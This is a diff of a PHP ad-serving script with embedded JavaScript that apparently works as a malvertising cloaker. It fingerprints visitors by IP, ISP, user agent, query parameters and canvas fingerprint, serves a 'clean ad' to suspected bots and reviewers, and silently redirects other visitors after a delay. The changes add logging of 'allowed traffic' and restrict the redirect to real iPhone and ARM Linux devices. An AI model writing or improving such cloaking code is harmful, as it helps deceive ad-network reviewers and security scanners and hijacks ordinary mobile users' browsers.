@@ -161,12 +161,26 @@
 		fclose($f);
 	}
 
-	function mbotlog($campaignID, $ip, $isp, $txt)
+	function createLogLine($campaignID, $ip, $isp, $txt)
 	{
 		$referrer = array_key_exists('HTTP_REFERER', $_SERVER) ? $_SERVER['HTTP_REFERER'] : "Unknown";
 		$line = "Date," . date('Y-m-d H:i:s') . ",IP," . $ip . ",ISP," . $isp . ",UserAgent," . $_SERVER['HTTP_USER_AGENT'] . ",Referrer," . $referrer . ",QueryString," . $_SERVER['QUERY_STRING'] . ",Message," . $txt . "\n";
 
+		return $line;		
+	}
+
+	function mbotlog($campaignID, $ip, $isp, $txt)
+	{
+		$line = createLogLine($campaignID, $ip, $isp, $txt);
 		$f = fopen("logs/mbotlog.$campaignID.log","a");
+		fwrite($f, $line);
+		fclose($f);
+	}
+
+	function allowedTrafficLog($campaignID, $ip, $isp)
+	{
+		$line = createLogLine($campaignID, $ip, $isp, "");
+		$f = fopen("logs/allowed_traffic.$campaignID.log","a");
 		fwrite($f, $line);
 		fclose($f);
 	}
@@ -304,7 +318,7 @@
 
 					if ($loggingEnabled)
 					{
-						mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter has blocked value: $_GET[$parameter]");
+						mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter has blocked value: $_GET[$parameter].");
 					}
 
 					break;
@@ -314,12 +328,15 @@
 			{
 				$serveCleanAd = true;
 
-				mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter missing from querystring");
+				if ($loggingEnabled)
+				{
+					mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter missing from querystring.");
+				}
 
 				break;
 			}
 		}
-	}	
+	}
 
 	if (!$serveCleanAd && !preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
 	{
@@ -403,6 +420,11 @@
 
 	if ($serveCleanAd || !$redirectEnabled)
 	{
+		if ($loggingEnabled && !$redirectEnabled)
+		{
+			adlog($campaignID, "Redirect disabled.");
+		}
+
 		if ($trackingPixelEnabled && !empty($trackingPixelUrl))
 		{
 			$onloadCode = " onload=\"addTrackingPixel();\"";
@@ -425,6 +447,11 @@
 	}
 	else
 	{
+		if ($loggingEnabled)
+		{
+			allowedTrafficLog($campaignID, $ip, $isp['isp']);
+		}
+
 		$sourceWeightList = array();
 
 		if (array_key_exists($adCountry, $sourceWeightListPerCountry))
@@ -479,7 +506,7 @@
 		$scriptCode = "<script type=\"text/javascript\">" .
 						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
 						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
-						   "function canvasFingerprint()
+						   "function getCanvasFingerprint()
 							{
 								var canvas = document.createElement('canvas');
 								var ctx = canvas.getContext('2d');
@@ -522,8 +549,9 @@
 							function inBlockedCanvasList()
 							{
 								var blockedList = [null, $blockedCanvasFingerprints];
+								var canvasFingerPrint = getCanvasFingerprint();
 
-								return blockedList.indexOf(canvasFingerprint()) !== -1;
+								return blockedList.indexOf(canvasFingerPrint) !== -1;
 							}" : "") .
 
 						   "$referrerDomainScript
@@ -554,12 +582,15 @@
 										{
 											return;
 										}" : "") .
-									   "setTimeout(function()
-										{
-											var topDomain = getReferrerDomain();
+									   "if (/(iphone|linux armv)/i.test(window.navigator.platform))
+									    {
+										    setTimeout(function()
+											{
+												var topDomain = getReferrerDomain();
 
-											$redirectCode
-										}, $redirectTimeout);
+												$redirectCode
+											}, $redirectTimeout);
+										}
 									}
 									else
 									{
